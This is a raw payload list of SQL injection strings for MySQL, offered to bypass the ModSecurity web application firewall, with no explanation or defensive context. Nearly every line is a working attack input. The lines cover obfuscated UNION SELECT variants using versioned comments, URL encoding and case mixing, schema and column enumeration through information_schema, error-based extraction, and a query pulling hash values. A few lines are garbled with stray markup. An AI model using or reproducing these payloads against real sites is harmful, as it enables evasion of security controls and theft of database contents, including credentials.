# sql injection payload+ bypass Mod_Security
```
 /*!UNION*/ /*!SELECT*/ 1
 /*!UNION*/ /*!SELECT*/ 1,2
 /*!UNION*/ /*!SELECT*/ 1,2,3
 /*!UNION*/ /*!SELECT*/ 1,2,3,4
 /*!UNION*/ /*!SELECT*/ 1,2,3,4,5
 /*!UNION*/ /*!SELECT*/ 1,2,3,4,5,6
 /*!UNION*/ /*!SELECT*/ 1,2,3,4,5,6,7
 
 /*!12345UNION*/ /*!12345SELECT*/ 1
 /*!12345UNION*/ /*!12345SELECT*/ 1,2
 /*!12345UNION*/ /*!12345SELECT*/ 1,2,3
 /*!12345UNION*/ /*!12345SELECT*/ 1,2,3,4
 /*!12345UNION*/ /*!12345SELECT*/ 1,2,3,4,5
 /*!12345UNION*/ /*!12345SELECT*/ 1,2,3,4,5,6
 /*!12345UNION*/ /*!12345SELECT*/ 1,2,3,4,5,6,7
 
 /*!12345UNION*/(/*!12345SELECT*/ 1)
 /*!12345UNION*/(/*!12345SELECT*/ 1,2)
 /*!12345UNION*/(/*!12345SELECT*/ 1,2,3)
 /*!12345UNION*/(/*!12345SELECT*/ 1,2,3,4)
 /*!12345UNION*/(/*!12345SELECT*/ 1,2,3,4,5)
 /*!12345UNION*/(/*!12345SELECT*/ 1,2,3,4,5,6)
 /*!12345UNION*/(/*!12345SELECT*/ 1,2,3,4,5,6,7)

 /*!%55nion*/%20/*!%53elect*/1
 /*!%55nion*/%20/*!%53elect*/%201,2
 /*!%55nion*/%20/*!%53elect*/%201,2,3
 /*!%55nion*/%20/*!%53elect*/%201,2,3,4
 /*!%55nion*/%20/*!%53elect*/%201,2,3,4,5
 /*!%55nion*/%20/*!%53elect*/%201,2,3,4,5,6
 /*!%55nion*/%20/*!%53elect*/%201,2,3,4,5,6,7
 
 /*!12345%55nion*/ /*!12345%53elect*/ 1
 /*!12345%55nion*/ /*!12345%53elect*/ 1,2
 /*!1234%55nion*/ /*!12345%53elect*/ 1,2,3
 /*!12345%55nion*/ /*!12345%53elect*/ 1,2,3,4
 /*!12345%55nion*/ /*!12345%53elect*/ 1,2,3,4,5
 /*!12345%55nion*/ /*!12345%53elect*/ 1,2,3,4,5,6
 /*!12345%55nion*/ /*!12345%53elect*/ 1,2,3,4,5,6,7
 
 /*!12345%55nion*/(/*!12345%53elect*/ 1)
 /*!12345%55nion*/(/*!12345%53elect*/ 1,2)
 /*!12345%55nion*/(/*!12345%53elect*/ 1,2,3)
 /*!12345%55nion*/(/*!12345%53elect*/ 1,2,3,4)
 /*!12345%55nion*/(/*!12345%53elect*/ 1,2,3,4,5)
 /*!12345%55nion*/(/*!12345%53elect*/ 1,2,3,4,5,6)
 /*!12345%55nion*/(/*!12345%53elect*/ 1,2,3,4,5,6,7)

/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=schEMA()-- -
/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like schEMA()-- -
/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=database()-- -
/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like database()-- -
/*!FrOm*/+%69nformation_schema./**/columns+/*!50000Where*/+/*!%54able_name*/=hex table
/*!FrOm*/+information_schema./**/columns+/*!12345Where*/+/*!%54able_name*/ like hex table

CoNcAt()
concat() 
CON%08CAT()
CoNcAt()
%0AcOnCat()
/**//*!12345cOnCat*/
/*!50000cOnCat*/(/*!*/)
unhex(hex(concat(table_name)))
unhex(hex(/*!12345concat*/(table_name)))
unhex(hex(/*!50000concat*/(table_name)))

/*!group_concat*/()
gRoUp_cOnCAt()
group_concat(/*!*/)
group_concat(/*!12345table_name*/)
group_concat(/*!50000table_name*/)
/*!group_concat*/(/*!12345table_name*/)
/*!group_concat*/(/*!50000table_name*/)
/*!12345group_concat*/(/*!12345table_name*/)
/*!50000group_concat*/(/*!50000table_name*/)
/*!GrOuP_ConCaT*/()
/*!12345GroUP_ConCat*/()
/*!50000gRouP_cOnCaT*/()
/*!50000Gr%6fuP_c%6fnCAT*/()
unhex(hex(group_concat(table_name)))
unhex(hex(/*!group_concat*/(/*!table_name*/)))
unhex(hex(/*!12345group_concat*/(table_name)))
unhex(hex(/*!12345group_concat*/(/*!table_name*/)))
unhex(hex(/*!12345group_concat*/(/*!12345table_name*/)))
unhex(hex(/*!50000group_concat*/(table_name)))
unhex(hex(/*!50000group_concat*/(/*!table_name*/)))
unhex(hex(/*!50000group_concat*/(/*!50000table_name*/)))
convert(group_concat(table_name)+using+ascii)
convert(group_concat(/*!table_name*/)+using+ascii)
convert(group_concat(/*!12345table_name*/)+using+ascii)
convert(group_concat(/*!50000table_name*/)+using+ascii)
CONVERT(group_concat(table_name)+USING+latin1)

/*!50000%55nIoN*/ /*!50000%53eLeCt*/
%55nion(%53elect 1,2,3)-- -
+union+distinct+select+
+union+distinctROW+select+
/**//*!12345UNION SELECT*//**/
/**//*!50000UNION SELECT*//**/
/**/UNION/**//*!50000SELECT*//**/
/*!50000UniON SeLeCt*/
union /*!50000%53elect*/
+ #?uNiOn + #?sEleCt
+ #?1q %0AuNiOn all#qa%0A#%0AsEleCt
/*!%55NiOn*/ /*!%53eLEct*/
/*!u%6eion*/ /*!se%6cect*/
+un/**/ion+se/**/lect
uni%0bon+se%0blect
%2f**%2funion%2f**%2fselect
union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
REVERSE(noinu)+REVERSE(tceles)
/*--*/union/*--*/select/*--*/
union (/*!/**/ SeleCT */ 1,2,3)
/*!union*/+/*!select*/
union+/*!select*/
/**/union/**/select/**/
/**/uNIon/**/sEleCt/**/
+%2F**/+Union/*!select*/
/**//*!union*//**//*!select*//**/
/*!uNIOn*/ /*!SelECt*/
+union+distinct+select+
+union+distinctROW+select+
uNiOn aLl sElEcT
UNIunionON+SELselectECT
/**/union/*!50000select*//**/
0%a0union%a0select%09
%0Aunion%0Aselect%0A
%55nion/**/%53elect
uni<on all="" sel="">/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/
%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/
%0A%09UNION%0CSELECT%10NULL%
/*!union*//*--*//*!all*//*--*//*!select*/
union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C
/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/
+UnIoN/*&a=*/SeLeCT/*&a=*/
union+sel%0bect
+uni*on+sel*ect+
+#1q%0Aunion all#qa%0A#%0Aselect
union(select (1),(2),(3),(4),(5))
UNION(SELECT(column)FROM(table))
%23xyz%0AUnIOn%23xyz%0ASeLecT+
%23xyz%0A%55nIOn%23xyz%0A%53eLecT+
union(select(1),2,3)
union (select 1111,2222,3333)
uNioN (/*!/**/ SeleCT */ 11)
union (select 1111,2222,3333)
+#1q%0AuNiOn all#qa%0A#%0AsEleCt
/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/
%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/
+%23sexsexsex%0AUnIOn%23sexsexs ex%0ASeLecT+
+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C
/*!f****U%0d%0aunion*/+/*!f****U%0d%0aSelEct*/
+%23blobblobblob%0aUnIOn%23blobblobblob%0aSeLe cT+
/*!blobblobblob%0d%0aunion*/+/*!blobblobblob%0d%0aSelEct*/
/union\sselect/g
/union\s+select/i
/*!UnIoN*/SeLeCT
+UnIoN/*&a=*/SeLeCT/*&a=*/
+uni>on+sel>ect+
+(UnIoN)+(SelECT)+
+(UnI)(oN)+(SeL)(EcT)
+’UnI”On’+'SeL”ECT’
+uni on+sel ect+
+/*!UnIoN*/+/*!SeLeCt*/+
/*!u%6eion*/ /*!se%6cect*/
uni%20union%20/*!select*/%20
union%23aa%0Aselect
/**/union/*!50000select*/
/^.*union.*$/ /^.*select.*$/
/*union*/union/*select*/select+
/*uni X on*/union/*sel X ect*/
+un/**/ion+sel/**/ect+
+UnIOn%0d%0aSeleCt%0d%0a
UNION/*&test=1*/SELECT/*&pwn=2*/
un?<ion sel="">+un/**/ion+se/**/lect+
+UNunionION+SEselectLECT+
+uni%0bon+se%0blect+
%252f%252a*/union%252f%252a /select%252f%252a*/
/%2A%2A/union/%2A%2A/select/%2A%2A/
%2f**%2funion%2f**%2fselect%2f**%2f
union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
/*!UnIoN*/SeLecT+
/*!50000select*/unhex(hex(/*!12345concat*/(0x223e,version(),0x223e,database())))
+/*!12120%55%6e%49%6f%4e*/+(%53%65%4c%65%43%74+111,222,333,database(),555,...)+--+

/*!u%6eion*/ /*!se%6cect*/+1,concat(@:=0,(select count(*)from information_schema.columns where@:=concat(@,'<br>',table_name,'::',column_name)),@),3..

(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x)

CONCAT(Tablas <br>,(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA!=information_schema)AND(0x00)IN(@x:=CONCAT(@x,LPAD(@NR:=@NR%2b1,2,0x30),0x3a20,table_name,0x3c62723e))))x))

/**8**/and/**8**/0/**8**//*!50000union*//**8**//*!50000select*//**8**/+ numero de columnas +--+

+/*!50000%55nIoN*/+/*!50000%53eLeCt*/+

SELECT * FROM (SELECT count(*), CONCAT((SELECT database()), 0x23, FLOOR(RAND(0)*2)) AS x FROM information_schema.columns GROUP BY x) y --

+uNiOn+(/*!/**/SeleCT*/+1,22,333...)+--+

%55%6e%49%6f%4e(/*!/**/%20SeleCT%20*/%2011,22,33,44,55,66,77,88,90,1010,1111,1212,1313,1414,1515,1616,1717,1818,1919....)

+/*✓*/UnIoN/*✓*/+/*✓*/AlL/*✓*/+(SeLeCt+1,2,3,%27soy%20vulnerable%27,5,6.....)+--+

+div+@a:=(current_user/**_**/())+UNION/**/DISTINCTROW+SELECT+1,2,@a,4+--+

%75nion/**)!*/sele%63%74/**)!*/+1,2,3....

/*!50000%75%6e%69on*/ %73%65%6cect 1,2,3,4,5--

+union(select+1,2,3,4,concat(column_name),6,...+from+information_schema.columns+where+table_name=%22columna%22+limit+1,1)+--+

+union(select+1,2,3,database(),concat(hash,0x3a,hash),6..+from(columna))+--+

/*!50000un0x696fn*/+/*!12345AlL*/(/*!50000se0x6c65ct*/+1)+--+

/*!50000%75%6e%69on*/ %73%65%6cect 1,2,3,4...

/*!12345UnioN*//**/(/*!12345seLECT*//**/1)+--

/*!12345#qa%0A#%0AUnIOn*/(/*!12345#qa%0A#%0ASeleCt*//**/1)+--+
```
